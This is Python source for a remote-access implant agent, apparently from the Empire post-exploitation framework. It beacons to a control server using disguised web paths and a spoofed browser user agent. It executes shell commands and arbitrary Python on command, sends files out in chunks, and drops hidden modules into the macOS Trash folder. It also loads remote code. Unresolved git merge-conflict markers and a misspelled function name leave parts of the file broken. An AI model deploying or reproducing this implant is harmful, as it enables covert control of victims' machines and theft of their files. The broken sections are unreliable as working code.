import __future__
#from __future__ import unicode_literals
import zipfile
import io
from HTMLParser import HTMLParser
from urllib import urlopen
import struct, time, base64, subprocess, random, time, datetime
from os.path import expanduser
from StringIO import StringIO
from threading import Thread
import os
import sys
import trace
import shlex
import zlib
import threading
import BaseHTTPServer
import zipfile
import imp


################################################
#
# agent configuration information
#
################################################

# print "starting agent"

# profile format ->
#   tasking uris | user agent | additional header 1 | additional header 2 | ...
profile = "/admin/get.php,/news.asp,/login/process.jsp|Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"

if server.endswith("/"): server = server[0:-1]

delay = 60
jitter = 0.0
lostLimit = 60
missedCheckins = 0
jobMessageBuffer = ""
# killDate form -> "MO/DAY/YEAR"
killDate = "" 
_installed_meta_cache = { }
# workingHours form -> "9:00-17:00"
workingHours = ""
meta_path = ""
t = ""
parts = profile.split("|")
taskURIs = parts[0].split(",")
userAgent = parts[1]
headersRaw = parts[2:]

defaultPage = base64.b64decode("")

_meta_cache = {}
moduleRepo = {}
jobs = []
global t

# global header dictionary
#   sessionID is set by stager.py
headers = {'User-Agent': userAgent, "Cookie": "SESSIONID=%s" %(sessionID)}

# parse the headers into the global header dictionary
for headerRaw in headersRaw:
    try:
        headerKey = headerRaw.split(":")[0]
        headerValue = headerRaw.split(":")[1]

        if headerKey.lower() == "cookie":
            headers['Cookie'] = "%s;%s" %(headers['Cookie'], headerValue)
        else:
            headers[headerKey] = headerValue
    except:
        pass


################################################
#
# communication methods
#
################################################

def sendMessage(packets=None):
    """
    Requests a tasking or posts data to a randomized tasking URI.

    If packets == None, the agent GETs a tasking from the control server.
    If packets != None, the agent encrypts the passed packets and 
        POSTs the data to the control server.
    """
    global missedCheckins
    global server
    global headers
    global taskURIs

    data = None
    if packets:
        data = "".join(packets)
        data = aes_encrypt_then_hmac(key, data)

    taskURI = random.sample(taskURIs, 1)[0]
    if (server.endswith(".php")):
        # if we have a redirector host already
        requestUri = server
    else:
        requestUri = server + taskURI

    try:
        data = (urllib2.urlopen(urllib2.Request(requestUri, data, headers))).read()
        return ("200", data)
    except urllib2.HTTPError as HTTPError:
        # if the server is reached, but returns an erro (like 404)
        missedCheckins = missedCheckins + 1
        return (HTTPError.code, "")
    except urllib2.URLError as URLerror:
        # if the server cannot be reached
        missedCheckins = missedCheckins + 1
        return (URLerror.reason, "")

    return ("","")


################################################
#
# encryption methods
#
################################################

def encodePacket(taskingID, packetData):
    """
    Encode a response packet.

        [4 bytes] - type
        [4 bytes] - counter
        [4 bytes] - length
        [X...]    - tasking data
    """

    # packetData = packetData.encode('utf-8').strip()

    taskID = struct.pack('=L', taskingID)
    counter = struct.pack('=L', 0)
    if(packetData):
        length = struct.pack('=L',len(packetData))
    else:
        length = struct.pack('=L',0)

    # b64data = base64.b64encode(packetData)

    if(packetData):
        packetData = packetData.decode('ascii', 'ignore').encode('ascii')

    return taskID + counter + length + packetData


def decodePacket(packet, offset=0):
    """
    Parse a tasking packet, returning (PACKET_TYPE, counter, length, data, REMAINING_PACKETES)

        [4 bytes] - type
        [4 bytes] - counter
        [4 bytes] - length
        [X...]    - tasking data
        [Y...]    - remainingData (possibly nested packet)
    """

    try:
        responseID = struct.unpack('=L', packet[0+offset:4+offset])[0]
        counter = struct.unpack('=L', packet[4+offset:8+offset])[0]
        length = struct.unpack('=L', packet[8+offset:12+offset])[0]
        # data = base64.b64decode(packet[12+offset:12+offset+length])
        data = packet[12+offset:12+offset+length]
        remainingData = packet[12+offset+length:]
        return (responseID, counter, length, data, remainingData)
    except Exception as e:
        print "decodePacket exception:",e
        return (None, None, None, None, None)


def processTasking(data):
    # processes an encrypted data packet
    #   -decrypts/verifies the response to get
    #   -extracts the packets and processes each

    try:
        tasking = aes_decrypt_and_verify(key, data)
        (taskingID, counter, length, data, remainingData) = decodePacket(tasking)

        # if we get to this point, we have a legit tasking so reset missedCheckins
        missedCheckins = 0

        # execute/process the packets and get any response
        resultPackets = ""
        result = processPacket(taskingID, data)
        if result:
            resultPackets += result

        packetOffset = 12 + length

        while remainingData and remainingData != "":

            (taskingID, counter, length, data, remainingData) = decodePacket(tasking, offset=packetOffset)

            result = processPacket(taskingID, data)
            if result:
                resultPackets += result

            packetOffset += 12 + length

        sendMessage(resultPackets)

    except Exception as e:
        print "processTasking exception:",e
        pass

def processJobTasking(result):
    # process job data packets
    #  - returns to the C2
    # execute/process the packets and get any response
    try:
        resultPackets = ""
        if result:
            resultPackets += result
        # send packets
        sendMessage(resultPackets)
    except Exception as e:
        print "processJobTasking exception:",e
        pass

def processPacket(taskingID, data):

    try:
        taskingID = int(taskingID)
    except Exception as e:
        return None

    if taskingID == 1:
        # sysinfo request
        # get_sysinfo should be exposed from stager.py
        return encodePacket(1, get_sysinfo())

    elif taskingID == 2:
        # agent exit

        msg = "[!] Agent %s exiting" %(sessionID)
        sendMessage(encodePacket(2, msg))
        agent_exit()

    elif taskingID == 40:
        # run a command
        resultData = str(run_command(data))
        return encodePacket(40, resultData)

    elif taskingID == 41:
        # file download

        filePath = os.path.abspath(data)
        if not os.path.exists(filePath):
            return encodePacket(40, "file does not exist or cannot be accessed")

        offset = 0
        size = os.path.getsize(filePath)
        partIndex = 0

        while True:

            # get 512kb of the given file starting at the specified offset
            encodedPart = get_file_part(filePath, offset=offset, base64=False)
            c = compress()
            start_crc32 = c.crc32_data(encodedPart)
            comp_data = c.comp_data(encodedPart)
            encodedPart = c.build_header(comp_data, start_crc32)
            encodedPart = base64.b64encode(encodedPart)

            partData = "%s|%s|%s" %(partIndex, filePath, encodedPart)
            if not encodedPart or encodedPart == '' or len(encodedPart) == 16:
                break

            sendMessage(encodePacket(41, partData))

            global delay
            global jitter
            if jitter < 0: jitter = -jitter
            if jitter > 1: jitter = 1/jitter

            minSleep = int((1.0-jitter)*delay)
            maxSleep = int((1.0+jitter)*delay)
            sleepTime = random.randint(minSleep, maxSleep)
            time.sleep(sleepTime)
            partIndex += 1
            offset += 5120000

    elif taskingID == 42:
        # file upload
        try:
            parts = data.split("|")
            filePath = parts[0]
            base64part = parts[1]
            raw = base64.b64decode(base64part)
            d = decompress()
            dec_data = d.dec_data(raw, cheader=True)
            if not dec_data['crc32_check']:
                sendMessage(encodePacket(0, "[!] WARNING: File upload failed crc32 check during decompressing!."))
                sendMessage(encodePacket(0, "[!] HEADER: Start crc32: %s -- Received crc32: %s -- Crc32 pass: %s!." %(dec_data['header_crc32'],dec_data['dec_crc32'],dec_data['crc32_check'])))
            f = open(filePath, 'ab')
            f.write(dec_data['data'])
            f.close()

            sendMessage(encodePacket(42, "[*] Upload of %s successful" %(filePath) ))
        except Exception as e:
            sendec_datadMessage(encodePacket(0, "[!] Error in writing file %s during upload: %s" %(filePath, str(e)) ))

    elif taskingID == 50:
        # return the currently running jobs
        msg = ""
        if len(jobs) == 0:
            msg = "No active jobs"
        else:
            msg = "Active jobs:\n"
            for x in xrange(len(jobs)):
                msg += "\t%s" %(x)
        return encodePacket(50, msg)

    elif taskingID == 51:
        # stop and remove a specified job if it's running
        try:
            # Calling join first seems to hang
            # result = jobs[int(data)].join()
            sendMessage(encodePacket(0, "[*] Attempting to stop job thread"))
            result = jobs[int(data)].kill()
            sendMessage(encodePacket(0, "[*] Job thread stoped!"))
            jobs[int(data)]._Thread__stop()
            jobs.pop(int(data))
            if result and result != "":
                sendMessage(encodePacket(51, result))
        except:
            return encodePacket(0, "error stopping job: %s" %(data))

    elif taskingID == 100:
        # dynamic code execution, wait for output, don't save outputPicl
        try:
            buffer = StringIO()
            sys.stdout = buffer
            code_obj = compile(data, '<string>', 'exec')
            exec code_obj in globals()
            sys.stdout = sys.__stdout__
            results = buffer.getvalue()
            return encodePacket(100, str(results))
        except Exception as e:
            errorData = str(buffer.getvalue())
            return encodePacket(0, "error executing specified Python data: %s \nBuffer data recovered:\n%s" %(e, errorData))

    elif taskingID == 101:
        # dynamic code execution, wait for output, save output
        prefix = data[0:15].strip()
        extension = data[15:20].strip()
        data = data[20:]
        try:
            buffer = StringIO()
            sys.stdout = buffer
            code_obj = compile(data, '<string>', 'exec')
            exec code_obj in globals()
            sys.stdout = sys.__stdout__
            c = compress()
            start_crc32 = c.crc32_data(buffer.getvalue())
            comp_data = c.comp_data(buffer.getvalue())
            encodedPart = c.build_header(comp_data, start_crc32)
            encodedPart = base64.b64encode(encodedPart)
            return encodePacket(101, '{0: <15}'.format(prefix) + '{0: <5}'.format(extension) + encodedPart )
        except Exception as e:
            # Also return partial code that has been executed
            errorData = str(buffer.getvalue())
            return encodePacket(0, "error executing specified Python data %s \nBuffer data recovered:\n%s" %(e, errorData))

    elif taskingID == 102:
        # on disk code execution for modules that require multiprocessing not supported by exec
        try:
            implantHome = expanduser("~") + '/.Trash/'
            moduleName = ".mac-debug-data"
            implantPath = implantHome + moduleName
            result = "[*] Module disk path: %s \n" %(implantPath) 
            with open(implantPath, 'w') as f:
                f.write(data)
            result += "[*] Module properly dropped to disk \n"
            pythonCommand = "python %s" %(implantPath)
            process = subprocess.Popen(pythonCommand, stdout=subprocess.PIPE, shell=True)
            data = process.communicate()
            result += data[0].strip()
            try:
                os.remove(implantPath)
                result += "\n[*] Module path was properly removed: %s" %(implantPath) 
            except Exception as e:
                print "error removing module filed: %s" %(e)
            fileCheck = os.path.isfile(implantPath)
            if fileCheck:
                result += "\n\nError removing module file, please verify path: " + str(implantPath)
            return encodePacket(100, str(result))
        except Exception as e:
            fileCheck = os.path.isfile(implantPath)
            if fileCheck:
                return encodePacket(0, "error executing specified Python data: %s \nError removing module file, please verify path: %s" %(e, implantPath))
            return encodePacket(0, "error executing specified Python data: %s" %(e))

    elif taskingID == 110:
        start_job(data)
        return encodePacket(110, "job %s started" %(len(jobs)-1))

    elif taskingID == 111:
        # TASK_CMD_JOB_SAVE
        # TODO: implement job structure
        pass

    elif taskingID == 122:
<<<<<<< HEAD
        try:
            #base64 and decompress the data.

=======
        
        try:
            t.kill()
            if meta_path:
                remove_meta(meta_path)
        except:
            pass

        try:
            #base64 and decompress the data. Then encode it again?
>>>>>>> b5697fc66b1f23c0331192c93a64579b5cc0587c
            parts = data.split('|')
            fileName = parts[0]
            base64part = parts[1]
            raw = base64.b64decode(base64part)
            d = decompress()
            dec_data = d.dec_data(raw, cheader=True)
            if not dec_data['crc32_check']:
                sendMessage(encodePacket(122, "[!] WARNING: Module import failed crc32 check during decompressing!."))
                sendMessage(encodePacket(122, "[!] HEADER: Start crc32: %s -- Received crc32: %s -- Crc32 pass: %s!." %(dec_data['header_crc32'],dec_data['dec_crc32'],dec_data['crc32_check'])))
<<<<<<< HEAD
        except:
            sendec_datadMessage(encodePacket(122, "[!] Error in Importing module %s during upload: %s" %(fileName, str(e)) ))

        zf = zipfile.ZipFile(io.BytesIO(dec_data['data']), 'r')
        moduleRepo[fileName] = zf
        install_hook(fileName)
        sendMessage(encodePacket(122, "Import of %s successful" %(fileName)))

    elif taskingID == 123:
        #Remove a module repo
        repoName = data
        try:
            remove_hook(repoName)
            sendMessage(encodePacket(123, "%s repo successfully removed" % (repoName)))
        except Exception as e:
            sendMessage(encodePacket(123, "Unable to remove repo: %s : %s" % (repoName, str(e))))
            

    elif taskingID == 124:
        #List all module repos and their contents
        repoName = data
        if repoName == "":
            loadedModules = "\nAll Repos\n"
            for key, value in moduleRepo.items():
                loadedModules += "\n----"+key+"----\n"
                loadedModules += '\n'.join(moduleRepo[key].namelist())

            sendMessage(encodePacket(124, loadedModules))
        else:
            try:
                loadedModules = "\n----"+repoName+"----\n"
                loadedModules += '\n'.join(moduleRepo[repoName].namelist())
                sendMessage(encodePacket(124, loadedModules))
            except Exception as e:
                msg = "Unable to retrieve repo contents: %s" % (str(e))
                sendMessage(encodePacket(124, msg))
=======
        except Exception as e:
            sendec_datadMessage(encodePacket(122, "[!] Error in Importing module %s during upload: %s" %(fileName, str(e)) ))

        port = random.randrange(1025,65535)
        print "Started webserver"
        #dec_data = base64.b64encode(dec_data)
        start_modulewebserver(dec_data['data'], '127.0.0.1', port)
        meta_path = "http://127.0.0.1:"+str(port)
        print "Installing meta path"
        install_meta(meta_path)
        sendMessage(encodePacket(122, "import of %s successful" %(fileName) ))
>>>>>>> b5697fc66b1f23c0331192c93a64579b5cc0587c

    else:
        return encodePacket(0, "invalid tasking ID: %s" %(taskingID))

################################################
#
# Custom Zip Importer
#
################################################


#adapted from https://github.com/sulinx/remote_importer

# [0] = .py ext, is_package = False
# [1] = /__init__.py ext, is_package = True
_search_order = [('.py', False), ('/__init__.py', True)]

class ZipImportError(ImportError):
    """Exception raised by zipimporter objects."""

# _get_info() = takes the fullname, then subpackage name (if applicable), 
# and searches for the respective module or package

class CFinder(object):
    """Import Hook for Empire"""
    def __init__(self, repoName):
        self.repoName = repoName
        self._source_cache = {}

    def _get_info(self, repoName, fullname):
        """Search for the respective package or module in the zipfile object"""
        parts = fullname.split('.')
        submodule = parts[-1]
        modulepath = '/'.join(parts)

        #check to see if that specific module exists

        for suffix, is_package in _search_order:
            relpath = modulepath + suffix
            try:
                moduleRepo[repoName].getinfo(relpath)
            except KeyError:
                pass
            else:
                return submodule, is_package, relpath

        #Error out if we can find the module/package
        msg = ('Unable to locate module %s in the %s repo' % (submodule, repoName))
        raise ZipImportError(msg)

    def _get_source(self, repoName, fullname):
        """Get the source code for the requested module"""
        submodule, is_package, relpath = self._get_info(repoName, fullname)
        fullpath = '%s/%s' % (repoName, relpath)
        if relpath in self._source_cache:
            source = self._source_cache[relpath]
            return submodule, is_package, fullpath, source
        try:
            source =  moduleRepo[repoName].read(relpath)
            source = source.replace('\r\n', '\n')
            source = source.replace('\r', '\n')
            self._source_cache[relpath] = source
            return submodule, is_package, fullpath, source
        except:
            raise ZipImportError("Unable to obtain source for module %s" % (fullpath))

    def find_module(self, fullname, path=None):

        try:
            submodule, is_package, relpath = self._get_info(self.repoName, fullname)
        except ImportError:
            return None
        else:
            return self

    def load_module(self, fullname):
        submodule, is_package, fullpath, source = self._get_source(self.repoName, fullname)
        code = compile(source, fullpath, 'exec')
        mod = sys.modules.setdefault(fullname, imp.new_module(fullname))
        mod.__loader__ = self
        mod.__file__ = fullpath
        mod.__name__ = fullname
        if is_package:
            mod.__path__ = [os.path.dirname(mod.__file__)]
        exec code in mod.__dict__
        return mod

    def get_data(self, fullpath):

        prefix = os.path.join(self.repoName, '')
        if not fullpath.startswith(prefix):
            raise IOError('Path %r does not start with module name %r', (fullpath, prefix))
        relpath = fullpath[len(prefix):]
        try:
            return moduleRepo[self.repoName].read(relpath)
        except KeyError:
            raise IOError('Path %r not found in repo %r' % (relpath, self.repoName))

    def is_package(self, fullname):
        """Return if the module is a package"""
        submodule, is_package, relpath = self._get_info(self.repoName, fullname)
        return is_package

    def get_code(self, fullname):
        submodule, is_package, fullpath, source = self._get_source(self.repoName, fullname)
        return compile(source, fullpath, 'exec')

def install_hook(repoName):
    if repoName not in _meta_cache:
        finder = CFinder(repoName)
        _meta_cache[repoName] = finder
        sys.meta_path.append(finder)

def remove_hook(repoName):
    if repoName in _meta_cache:
        finder = _meta_cache.pop(repoName)
        sys.meta_path.remove(finder)

################################################
#
# Custom Web Importer
#
################################################

def _get_links(url):
    class LinkParser(HTMLParser):
        def handle_starttag(self, tag, attrs):
            if tag == 'a':
                attrs = dict(attrs)
                links.add(attrs.get('href').rstrip('/'))
    links = set()
    try:
        u = urlopen(url)
        parser = LinkParser()
        parser.feed(u.read().decode('utf-8'))
    except Exception as e:
        pass

    return links

class UrlMetaFinder(object):
    
    def __init__(self, baseurl):
        self._baseurl = baseurl
        self._links = { }
        self._loaders = { baseurl : UrlModuleLoader(baseurl) }

    def find_module(self, fullname, path=None):
        if path is None:
            baseurl = self._baseurl
        else:
            if not path[0].startswith(self._baseurl):
                return None
            baseurl = path[0]
        parts = fullname.split('.')
        basename = parts[-1]
        #check the link cache
        if basename not in self._links:
            self._links[baseurl] = _get_links(baseurl)
        #check if it's a package
        if basename in self._links[baseurl]:
            fullurl = self._baseurl + '/' + basename
            #Attempt to load the package (which accesses __init__.py)
            loader = UrlPackageLoader(fullurl)
            try:
                loader.load_module(fullname)
                self._links[fullurl] = _get_links(fullurl)
                self._loaders[fullurl] = UrlModuleLoader(fullurl)
            except ImportError as e:
                loader = None
            return loader

        filename = basename + '.py'
        if filename in self._links[baseurl]:
            return self._loaders[baseurl]
        else:
            return None

    def invalidate_caches(self):
        self._links.clear()

class UrlModuleLoader(object):
    
    def __init__(self, baseurl):
        self._baseurl = baseurl
        self._source_cache = {}

    def module_repr(self, module):
        return '<urlmodule %r from %r>' % (module.__name__, module.__file__)

    def load_module(self, fullname):
        code = self.get_code(fullname)
        mod = sys.modules.setdefault(fullname, imp.new_module(fullname))
        mod.__file__ = self.get_filename(fullname)
        mod.__loader__ = self
        if fullname == fullname.split('.')[0]:
            mod.__package__ = fullname.rpartition('.')[2]
        else:
            mod.__package__ = fullname.rpartition('.')[0]
        print "Loading module with exec call"
        exec(code, mod.__dict__)
        return mod

    def get_code(self, fullname):
        print "Obtaining source code for module"
        src = self.get_source(fullname)
        return compile(src, self.get_filename(fullname), 'exec')

    def get_data(self, path):
        pass

    def get_filename(self, fullname):
        return self._baseurl + '/' + fullname.split('.')[-1] + '.py'

    def get_source(self, fullname):
        filename = self.get_filename(fullname)
        if filename in self._source_cache:
            return self._source_cache[filename]
        try:
            u = urlopen(filename)
            source = u.read().decode('ascii')
            self._source_cache[filename] = source
            return source
        except e:
            raise ImportError("Can't load %s" % filename)

    def is_package(self, fullname):
        return False

class UrlPackageLoader(UrlModuleLoader):

    def load_module(self, fullname):
        mod = super(UrlPackageLoader, self).load_module(fullname)
        mod.__path__ = [self._baseurl]
        mod.__package__ = fullname

    def get_filename(self, fullname):
        return self._baseurl + '/' + '__init__.py'

    def is_package(self, fullname):
        return True


def install_meta(address):
    print "Installed meta_finder"
    if address not in _installed_meta_cache:
        finder = UrlMetaFinder(address)
        _installed_meta_cache[address] = finder
        sys.meta_path.append(finder)

def remove_meta(address):
    if address in _installed_meta_cache:
        finder = _installed_meta_cache.pop(address)
        sys.meta_path.remove(finder)

################################################
#
# misc methods
#
################################################
class compress(object):
    
    '''
    Base clase for init of the package. This will handle
    the initial object creation for conducting basic functions.
    '''

    CRC_HSIZE = 4
    COMP_RATIO = 9

    def __init__(self, verbose=False):
        """
        Populates init.
        """
        pass

    def comp_data(self, data, cvalue=COMP_RATIO):
        '''
        Takes in a string and computes
        the comp obj.
        data = string wanting compression
        cvalue = 0-9 comp value (default 6)
        '''
        cdata = zlib.compress(data,cvalue)
        return cdata

    def crc32_data(self, data):
        '''
        Takes in a string and computes crc32 value.
        data = string before compression
        returns:
        HEX bytes of data
        '''
        crc = zlib.crc32(data) & 0xFFFFFFFF
        return crc

    def build_header(self, data, crc):
        '''
        Takes comp data, org crc32 value,
        and adds self header.
        data =  comp data
        crc = crc32 value
        '''
        header = struct.pack("!I",crc)
        built_data = header + data
        return built_data

class decompress(object):
    
    '''
    Base clase for init of the package. This will handle
    the initial object creation for conducting basic functions.
    '''

    CRC_HSIZE = 4
    COMP_RATIO = 9

    def __init__(self, verbose=False):
        """
        Populates init.
        """
        pass

    def dec_data(self, data, cheader=True):
        '''
        Takes:
        Custom / standard header data
        data = comp data with zlib header
        BOOL cheader = passing custom crc32 header
        returns:
        dict with crc32 cheack and dec data string
        ex. {"crc32" : true, "dec_data" : "-SNIP-"}
        '''
        if cheader:
            comp_crc32 = struct.unpack("!I", data[:self.CRC_HSIZE])[0]
            dec_data = zlib.decompress(data[self.CRC_HSIZE:])
            dec_crc32 = zlib.crc32(dec_data) & 0xFFFFFFFF
            if comp_crc32 == dec_crc32:
                crc32 = True
            else:
                crc32 = False
            return { "header_crc32" : comp_crc32, "dec_crc32" : dec_crc32, "crc32_check" : crc32, "data" : dec_data }
        else:
            dec_data = zlib.decompress(data)
            return dec_data

def agent_exit():
    # exit for proper job / thread cleanup
    if len(jobs) > 0:
        try:
            for x in jobs:
                jobs[int(x)].kill()
                jobs.pop(x)
        except:
            # die hard if thread kill fails
            pass
    exit()

def indent(lines, amount=4, ch=' '):
    padding = amount * ch
    return padding + ('\n'+padding).join(lines.split('\n'))


# from http://stackoverflow.com/questions/6893968/how-to-get-the-return-value-from-a-thread-in-python
class ThreadWithReturnValue(Thread):
    def __init__(self, group=None, target=None, name=None,
                 args=(), kwargs={}, Verbose=None):
        Thread.__init__(self, group, target, name, args, kwargs, Verbose)
        self._return = None
    def run(self):
        if self._Thread__target is not None:
            self._return = self._Thread__target(*self._Thread__args,
                                                **self._Thread__kwargs)
    def join(self):
        Thread.join(self)
        return self._return


class KThread(threading.Thread):

    """A subclass of threading.Thread, with a kill()
  method."""

    def __init__(self, *args, **keywords):
        threading.Thread.__init__(self, *args, **keywords)
        self.killed = False

    def start(self):
        """Start the thread."""
        self.__run_backup = self.run
        self.run = self.__run      # Force the Thread toinstall our trace.
        threading.Thread.start(self)

    def __run(self):
        """Hacked run function, which installs the
    trace."""
        sys.settrace(self.globaltrace)
        self.__run_backup()
        self.run = self.__run_backup

    def globaltrace(self, frame, why, arg):
        if why == 'call':
            return self.localtrace
        else:
            return None

    def localtrace(self, frame, why, arg):
        if self.killed:
            if why == 'line':
                raise SystemExit()
        return self.localtrace

    def kill(self):
        self.killed = True



def start_job(code):

    global jobs

    # create a new code block with a defined method name
    codeBlock = "def method():\n" + indent(code)

    # register the code block
    code_obj = compile(codeBlock, '<string>', 'exec')
    # code needs to be in the global listing
    # not the locals() scope
    exec code_obj in globals()

    # create/processPacketstart/return the thread
    # call the job_func so sys data can be cpatured
    codeThread = KThread(target=job_func)
    codeThread.start()

    jobs.append(codeThread)


def job_func():
    try:
        old_stdout = sys.stdout  
        sys.stdout = mystdout = StringIO()
        # now call the function required 
        # and capture the output via sys
        method()
        sys.stdout = old_stdout
        dataStats_2 = mystdout.getvalue()
        result = encodePacket(110, str(dataStats_2))
        processJobTasking(result)
    except Exception as e:
        p = "error executing specified Python job data: " + str(e)
        result = encodePacket(0, p)
        processJobTasking(result)

def job_message_buffer(message):
    # Supports job messages for checkin
    global jobMessageBuffer
    try:

        jobMessageBuffer += str(message)
    except Exception as e:
        print e

def get_job_message_buffer():
    global jobMessageBuffer
    try:
        result = encodePacket(110, str(jobMessageBuffer))
        jobMessageBuffer = ""
        return result
    except Exception as e:
        return encodePacket(0, "[!] Error getting job output: %s" %(e))

def send_job_message_buffer():
    if len(jobs) > 0:
        result = get_job_message_buffer()
        processJobTasking(result)
    else:
        pass

def start_webserver(data, ip, port, serveCount):
    # thread data_webserver for execution
    t = KThread(target=data_webserver, args=(data, ip, port, serveCount))
    t.start()
    return

def start_modulewebserver(data, ip, port):
    # thread modulewebserver for execution
    t = KThread(target=module_webserver, args=(data, ip, port))
    t.start()
    return

def data_webserver(data, ip, port, serveCount):
    # hosts a file on port and IP servers data string
    hostName = str(ip) 
    portNumber = int(port)
    data = str(data)
    serveCount = int(serveCount)
    count = 0
    class serverHandler(BaseHTTPServer.BaseHTTPRequestHandler):
        def do_GET(s):
            """Respond to a GET request."""
            s.send_response(200)
            s.send_header("Content-type", "text/html")
            s.end_headers()
            s.wfile.write(data)
        def log_message(s, format, *args):
            return
    server_class = BaseHTTPServer.HTTPServer
    httpServer = server_class((hostName, portNumber), serverHandler)
    try:
        while (count < serveCount):
            httpServer.handle_request()
            count += 1
    except:
        pass
    httpServer.server_close()
    return


def module_webserver(data, ip, port):
    #host a python module on a webserver for the Custom web importer
    print "In module_webserver"
    hostName = str(ip)
    portNumber = int(port)
    zf = zipfile.ZipFile(io.BytesIO(data), "r")
    paths = zf.namelist()
    class serverHandler(BaseHTTPServer.BaseHTTPRequestHandler):
        def do_GET(self):
            """Respond to a GET request"""
            response = ""
            filesDirs = []
            mimetype = 'text/html'
            trimPath = self.path.lstrip('/')
            if self.path == '/':
                #show all available directories and files at the root path 
                for content in paths:
                    if os.path.splitext(content.split(self.path)[0])[-1] != '':
                        filesDirs.append(content.split(self.path)[0])
                    else:
                        filesDirs.append(content.split(self.path)[0]+"/")
                    #remove dups
                filesDirs = list(set(filesDirs))
                for path in filesDirs:
                    response += "<li><a href='%s'>%s</a>\r\n" % (path,path)
                print "%s 200" % self.requestline
                self.send_response(200)
                self.send_header('Content-type', mimetype)
                self.end_headers()
                self.wfile.write(response.decode('ascii'))
            elif self.path.endswith('/'):
                for content in paths:
                    if content == content.split(trimPath)[0]:
                        continue
                    if os.path.splitext(content.split(trimPath)[-1])[-1] != '':
                        filesDirs.append(content.split(trimPath)[-1])
                    else:
                        filesDirs.append(content.split(trimPath)[-1])
                if len(filesDirs) != 0:
                    for path in filesDirs:
                        response += "<li><a href='%s'>%s</a>\r\n" % (path,path)
                    print "%s 200" % self.requestline
                    self.send_response(200)
                    self.send_header('Content-type', mimetype)
                    self.end_headers()
                    self.wfile.write(response.decode('ascii'))
                else:
                    print "%s 404" % self.requestline
                    self.send_response(404)
                    self.send_header('Content-type', 'text/plain')
                    self.end_headers()
                    self.wfile.write("file not found")
            elif self.path.endswith('.py'):
                print "%s 200" % self.requestline
                try:
                    response = zf.open(trimPath, 'r').read()
                    self.send_response(200)
                    self.send_header('Content-type', 'text/plain')
                    self.end_headers()
                    self.wfile.write(response.decode('ascii'))
                except:
                    print "%s 404" % self.requestline
                    self.send_response(404)
                    self.send_header('Content-type', 'text/plain')
                    self.end_headers()
                    self.wfile.write('file not found')
            elif self.path.endswith(''):
                print "%s 301" % self.requestline
                self.send_response(301)
                self.send_header("Location", "http://%s:%s%s/" % (hostName,port,self.path))
                self.end_headers()
            else:
                try:
                    response = zf.open(trimPath, 'r').read()
                    print "%s 200" % self.requestline
                    self.send_response(200)
                    self.send_header('Content-type', 'text/plain')
                    self.end_headers()
                    self.wfile.write(response.decode('ascii'))
                except:
                    print "%s 404" % self.requestline
                    self.send_response(404)
                    self.send_header('Content-type', 'text/plain')
                    self.end_headers()
                    self.wfile.write('file not found') 

        def log_message(s, format, *args):
            return

    server_class = BaseHTTPServer.HTTPServer
    httpServer = server_class((hostName,portNumber), serverHandler)
    httpServer.serve_forever()

# additional implementation methods
def run_command(command):
    if "|" in command:    
        command_parts = command.split('|')
    elif ">" in command or ">>" in command or "<" in command or "<<" in command:   
        p = subprocess.Popen(command,stdin=None, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, shell=True)
        return ''.join(list(iter(p.stdout.readline, b'')))
    else:
        command_parts = []
        command_parts.append(command)
    i = 0
    p = {}
    for command_part in command_parts:
        command_part = command_part.strip()
        if i == 0:
            p[i]=subprocess.Popen(shlex.split(command_part),stdin=None, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        else:
            p[i]=subprocess.Popen(shlex.split(command_part),stdin=p[i-1].stdout, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        i = i +1
    (output, err) = p[i-1].communicate()
    exit_code = p[0].wait()
    if exit_code != 0:
        errorStr =  "Shell Output: " + str(output) + '\n'
        errorStr += "Shell Error: " + str(err) + '\n'
        return errorStr
    else:
        return str(output)


def get_file_part(filePath, offset=0, chunkSize=512000, base64=True):

    if not os.path.exists(filePath):
        return ''

    f = open(filePath, 'rb')
    f.seek(offset, 0)
    data = f.read(chunkSize)
    f.close()
    if base64: 
        return base64.b64encode(data)
    else:
        return data

################################################
#
# main agent functionality
#
################################################

while(True):

    # TODO: jobs functionality

    if workingHours != "":
        try:
            start,end = workingHours.split("-")
            now = datetime.datetime.now()
            startTime = datetime.datetime.strptime(start, "%H:%M")
            endTime = datetime.datetime.strptime(end, "%H:%M")

            if not (startTime <= now <= endTime):
                sleepTime = startTime - now
                # print "not in working hours, sleeping %s seconds" %(sleepTime.seconds)
                # sleep until the start of the next window
                time.sleep(sleepTime.seconds)

        except Exception as e:
            pass

    # check if we're past the killdate for this agent
    #   killDate form -> MO/DAY/YEAR
    if killDate != "":
        now = datetime.datetime.now().date()
        killDateTime = datetime.datetime.strptime(killDate, "%m/%d/%Y").date()
        if now > killDateTime:
            msg = "[!] Agent %s exiting" %(sessionID)
            sendMessage(encodePacket(2, msg))
            agent_exit()

    # exit if we miss commnicating with the server enough times
    if missedCheckins >= lostLimit:
        agent_exit()

    # sleep for the randomized interval
    if jitter < 0: jitter = -jitter
    if jitter > 1: jitter = 1/jitter
    minSleep = int((1.0-jitter)*delay)
    maxSleep = int((1.0+jitter)*delay)

    sleepTime = random.randint(minSleep, maxSleep)
    time.sleep(sleepTime)

    (code, data) = sendMessage()
    if code == "200":
        try:
            send_job_message_buffer()
        except Exception as e:
            result = encodePacket(0, str('[!] Failed to check job buffer!: ' + str(e)))
            processJobTasking(result)
        if data == defaultPage:
            missedCheckins = 0
        else:
            processTasking(data)
    else:
        pass
        # print "invalid code:",code
